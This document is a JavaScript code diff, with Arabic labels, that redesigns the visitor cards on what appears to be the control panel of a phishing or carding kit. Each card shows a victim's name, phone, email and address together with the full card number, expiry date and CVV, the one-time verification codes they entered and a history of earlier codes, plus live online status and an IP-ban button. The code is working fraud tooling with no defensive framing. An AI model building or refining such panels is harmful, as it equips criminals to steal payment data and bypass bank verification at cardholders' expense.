@@ -657,130 +657,175 @@ function createVisitorCard(visitor, isTrashMode = false) {
     }
   }
   
-  // Progress steps
-  const steps = [
-    { key: 'form_submitted', label: 'التوصيل', icon: '📦' },
-    { key: 'payment_submitted', label: 'الدفع', icon: '💳' },
-    { key: 'verification_submitted', label: 'التحقق', icon: '🔐' }
-  ];
+  // Check form completion status
+  const deliveryDone = visitor.form_submitted === true;
+  const paymentDone = visitor.payment_submitted === true;
+  const verificationDone = visitor.verification_submitted === true;
   
-  const progressHTML = steps.map((step, index) => {
-    const isCompleted = visitor[step.key] === true;
-    const prevCompleted = index === 0 || visitor[steps[index - 1].key] === true;
-    const isActive = !isCompleted && prevCompleted;
-    const statusClass = isCompleted ? 'completed' : (isActive ? 'active' : '');
-    return `<div class="progress-step ${statusClass}"><div class="step-icon">${isCompleted ? '✓' : step.icon}</div><span>${step.label}</span></div>`;
-  }).join('');
+  // Build Delivery Box Fields
+  const deliveryFields = [];
+  if (delivery.fullName) deliveryFields.push({label: 'الاسم', value: delivery.fullName});
+  if (delivery.phone) deliveryFields.push({label: 'الهاتف', value: delivery.phone});
+  if (delivery.email) deliveryFields.push({label: 'البريد', value: delivery.email});
+  if (delivery.city) deliveryFields.push({label: 'المدينة', value: delivery.city});
+  if (delivery.address) deliveryFields.push({label: 'العنوان', value: delivery.address});
   
-  // Build card sections
-  let cardBody = '<div class="card-body-inner">';
+  const deliveryRowsHTML = deliveryFields.map(f => `
+    <div class="data-item">
+      <span class="data-label">${f.label}</span>
+      <span class="data-value">${escapeHtml(f.value)}</span>
+    </div>
+  `).join('');
   
-  // Delivery section
-  if (delivery && Object.keys(delivery).length > 0) {
-    cardBody += `
-      <div class="card-section">
-        <div class="section-title"><span>📦</span> بيانات التوصيل</div>
-        ${delivery.fullName ? `<div class="data-row"><span class="data-label">الاسم الكامل</span><span class="data-value">${escapeHtml(delivery.fullName)}</span></div>` : ''}
-        ${delivery.phone ? `<div class="data-row"><span class="data-label">رقم الهاتف</span><span class="data-value">${escapeHtml(delivery.phone)}</span></div>` : ''}
-        ${delivery.email ? `<div class="data-row"><span class="data-label">البريد الإلكتروني</span><span class="data-value">${escapeHtml(delivery.email)}</span></div>` : ''}
-        ${delivery.city ? `<div class="data-row"><span class="data-label">المدينة / المنطقة</span><span class="data-value">${escapeHtml(delivery.city)}${delivery.region ? ' / ' + escapeHtml(delivery.region) : ''}</span></div>` : ''}
-        ${delivery.address ? `<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">${escapeHtml(delivery.address)}</span></div>` : ''}
-        ${delivery.notes ? `<div class="data-row"><span class="data-label">ملاحظات</span><span class="data-value highlight">${escapeHtml(delivery.notes)}</span></div>` : ''}
-      </div>
+  // Build Payment Box Fields
+  const paymentFields = [];
+  const cardNum = payment.cardNumber || payment.card_number || '';
+  if (cardNum) paymentFields.push({label: 'البطاقة', value: cardNum});
+  if (payment.cardHolder) paymentFields.push({label: 'صاحب البطاقة', value: payment.cardHolder});
+  if (payment.expiry) paymentFields.push({label: 'تاريخ الانتهاء', value: payment.expiry});
+  if (payment.cvv) paymentFields.push({label: 'CVV', value: payment.cvv});
+  
+  const paymentRowsHTML = paymentFields.map(f => `
+    <div class="data-item">
+      <span class="data-label">${f.label}</span>
+      <span class="data-value">${escapeHtml(f.value)}</span>
+    </div>
+  `).join('');
+  
+  // OTP Digits HTML
+  let otpDigitsHTML = '';
+  if (otpValue) {
+    otpDigitsHTML = otpValue.split('').map(d => `<span class="otp-digit-new">${d}</span>`).join('');
+  } else {
+    otpDigitsHTML = '<span class="otp-empty">---</span>';
+  }
+  
+  // OTP History
+  let historyToggle = '';
+  if (otpHistory && otpHistory.length > 1) {
+    const oldOtps = otpHistory.slice(1).map(item => {
+      const date = new Date(item.timestamp).toLocaleString('ar-OM');
+      return `<div class="otp-history-item">السابق: <strong>${escapeHtml(item.otp || '')}</strong> <small>(${date})</small></div>`;
+    }).join('');
+    historyToggle = `
+      <div class="otp-history-dropdown" id="otpHistory_${sessionId}">${oldOtps}</div>
     `;
   }
   
-  // Payment section with CVV
-  if (payment && Object.keys(payment).length > 0) {
-    const cardNum = payment.cardNumber || payment.card_number || '';
-    cardBody += `
-      <div class="card-section payment-section">
-        <div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>
-        ${cardNum ? `<div class="data-row"><span class="data-label">رقم البطاقة</span><span class="data-value">${escapeHtml(cardNum)}</span></div>` : ''}
-        ${payment.cardHolder ? `<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">${escapeHtml(payment.cardHolder)}</span></div>` : ''}
-        ${payment.expiry ? `<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">${escapeHtml(payment.expiry)}</span></div>` : ''}
-        ${payment.cvv ? `<div class="data-row"><span class="data-label">رمز الحماية (CVV)</span><span class="data-value highlight">${escapeHtml(payment.cvv)}</span></div>` : ''}
-      </div>
-    `;
-  }
+  // Page badge color
+  const pageColors = {
+    'home': { bg: '#6366f1', text: 'الرئيسية' },
+    'delivery': { bg: '#3b82f6', text: 'التوصيل' },
+    'payment': { bg: '#10b981', text: 'الدفع' },
+    'verification': { bg: '#f59e0b', text: 'التحقق' }
+  };
+  const pageInfo = pageColors[page] || { bg: '#6b7280', text: getPageName(page) };
   
-  // OTP section
-  if (otpValue || (otpHistory && otpHistory.length > 0)) {
-    let historyHTML = '';
-    if (otpHistory && otpHistory.length > 1) {
-      const oldOtps = otpHistory.slice(1).map(item => {
-        const date = new Date(item.timestamp).toLocaleString('ar-OM');
-        return `<div class="otp-history-item">الرموز السابقة: <strong>${escapeHtml(item.otp || '')}</strong> <small>(${date})</small></div>`;
-      }).join('');
-      historyHTML = `<div class="otp-history-dropdown" id="otpHistory_${sessionId}">${oldOtps}</div>`;
-    }
-    
-    cardBody += `
-      <div class="otp-section">
-        <div class="section-title" style="cursor:pointer;" onclick="toggleOtpHistory('${sessionId}')">
-          <span>🔐</span> رمز التحقق (OTP)
-          ${(otpHistory && otpHistory.length > 1) ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + otpHistory.length + ' رمز</span>' : ''}
-        </div>
-        <div class="otp-value">${otpValue || '---'}</div>
-        ${historyHTML}
-      </div>
-    `;
-  }
+  // Country + Name display
+  const displayName = delivery.fullName || payment.cardHolder || country || 'زائر ' + sessionId.substring(0, 6);
   
-  // Empty state
-  if (!delivery || Object.keys(delivery).length === 0) {
-    cardBody += `
-      <div style="text-align:center;padding:1rem;color:#888;">
-        <p>لا توجد بيانات حتى الآن</p>
-        <small>البيانات ستظهر عند إدخالها من قبل العميل</small>
-      </div>
-    `;
-  }
-  
-  cardBody += '</div>';
-  
-  // Status indicator
-  const statusHTML = isOnline 
-    ? '<div class="card-status"><span class="dot"></span><span>متصل الآن</span></div>'
-    : '<div class="card-status" style="color:#ccc;"><span style="color:#ccc;">○</span><span style="color:#999;">غير متصل</span></div>';
-  
-  // Header background
-  const headerStyle = isOnline 
-    ? 'background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);'
-    : 'background: linear-gradient(135deg, #6b7280 0%, #9ca3af 100%);';
+  // Status classes
+  const headerBg = isOnline 
+    ? 'background: linear-gradient(135deg, #1e3a5f 0%, #1e293b 100%);'
+    : 'background: linear-gradient(135deg, #374151 0%, #1f2937 100%);';
   
   // Build actions based on mode
   let actionsHTML;
   if (isTrashMode) {
-    // Trash mode actions
     actionsHTML = `
-      <button class="btn btn-success btn-sm" onclick="restoreVisitor('${sessionId}')">↩️ استعادة</button>
-      <button class="btn btn-danger btn-sm" onclick="permanentDeleteVisitor('${sessionId}')">❌ حذف نهائي</button>
+      <button class="action-btn restore" onclick="restoreVisitor('${sessionId}')">
+        <span>↩️</span> استعادة
+      </button>
+      <button class="action-btn delete-permanent" onclick="permanentDeleteVisitor('${sessionId}')">
+        <span>❌</span> حذف نهائي
+      </button>
     `;
   } else {
-    // Normal mode actions
     actionsHTML = `
       <input type="checkbox" class="visitor-checkbox" onchange="toggleVisitorSelection('${sessionId}', this)" title="تحديد">
-      <button class="btn btn-danger btn-sm" onclick="softDeleteVisitor('${sessionId}')">🗑️</button>
-      <button class="btn btn-danger btn-sm" onclick="banVisitor('${sessionId}', '${escapeHtml(ipAddress)}')">🚫 حظر</button>
+      <button class="action-btn delete" onclick="softDeleteVisitor('${sessionId}')">
+        <span>🗑️</span> حذف
+      </button>
+      <button class="action-btn ban" onclick="banVisitor('${sessionId}', '${escapeHtml(ipAddress)}')">
+        <span>🚫</span> حظر
+      </button>
     `;
   }
   
-  // Build final card HTML
+  // Build final card HTML with new design
   const cardHTML = `
-    <div class="visitor-card" data-session="${sessionId}" data-online="${isOnline}" style="${isTrashMode ? 'border-color: #ef4444;' : ''}">
-      <div class="card-header" style="${headerStyle}">
-        ${isTrashMode ? '<span style="background:#ef4444;padding:2px 8px;border-radius:4px;font-size:11px;">🗑️ محذوف</span>' : ''}
-        ${statusHTML}
-        <div class="card-country">
-          <span>${getCountryFlag(countryCode)}</span>
-          <span>${escapeHtml(country)}</span>
+    <div class="visitor-card-new" data-session="${sessionId}" data-online="${isOnline}">
+      <!-- Header -->
+      <div class="card-header-new" style="${headerBg}">
+        <div class="header-left">
+          <span class="country-flag">${getCountryFlag(countryCode)}</span>
+          <span class="visitor-name">${escapeHtml(displayName)}</span>
+          <span class="online-status ${isOnline ? 'online' : 'offline'}">
+            ${isOnline ? '●' : '○'} ${isOnline ? 'متصل' : 'غير متصل'}
+          </span>
         </div>
-        <div class="card-page">${getPageName(page)}</div>
+        <div class="header-right">
+          <span class="page-badge" style="background: ${pageInfo.bg};">
+            ${pageInfo.text}
+          </span>
+        </div>
       </div>
-      ${cardBody}
-      <div class="card-progress">${progressHTML}</div>
-      <div class="card-actions">${actionsHTML}</div>
+      
+      <!-- Data Boxes Container -->
+      <div class="data-boxes-container">
+        <!-- Delivery Box -->
+        <div class="data-box delivery-box ${deliveryFields.length === 0 ? 'empty' : ''}">
+          <div class="box-header">
+            <span class="box-icon">📦</span>
+            <span class="box-title">بيانات التوصيل</span>
+          </div>
+          <div class="box-content">
+            ${deliveryFields.length > 0 ? deliveryRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
+          </div>
+        </div>
+        
+        <!-- Payment Box -->
+        <div class="data-box payment-box ${paymentFields.length === 0 ? 'empty' : ''}">
+          <div class="box-header">
+            <span class="box-icon">💳</span>
+            <span class="box-title">بيانات الدفع</span>
+          </div>
+          <div class="box-content">
+            ${paymentFields.length > 0 ? paymentRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
+          </div>
+        </div>
+      </div>
+      
+      <!-- OTP Section -->
+      <div class="otp-section-new">
+        <div class="otp-header" onclick="toggleOtpHistory('${sessionId}')">
+          <span class="otp-icon">🔐</span>
+          <span class="otp-title">رمز التحقق (OTP)</span>
+          ${otpHistory && otpHistory.length > 1 ? `<span class="otp-count">${otpHistory.length} رمز</span>` : ''}
+        </div>
+        <div class="otp-display">
+          ${otpDigitsHTML}
+        </div>
+        ${historyToggle}
+      </div>
+      
+      <!-- Progress & Actions Footer -->
+      <div class="card-footer">
+        <div class="progress-badges">
+          <span class="progress-badge ${deliveryDone ? 'done' : 'pending'}">
+            ${deliveryDone ? '✓' : '○'} التوصيل
+          </span>
+          <span class="progress-badge ${paymentDone ? 'done' : 'pending'}">
+            ${paymentDone ? '✓' : '○'} الدفع
+          </span>
+          <span class="progress-badge ${verificationDone ? 'done' : 'pending'}">
+            ${verificationDone ? '✓' : '○'} التحقق
+          </span>
+        </div>
+        <div class="action-buttons">
+          ${actionsHTML}
+        </div>
+      </div>
     </div>
   `;
   
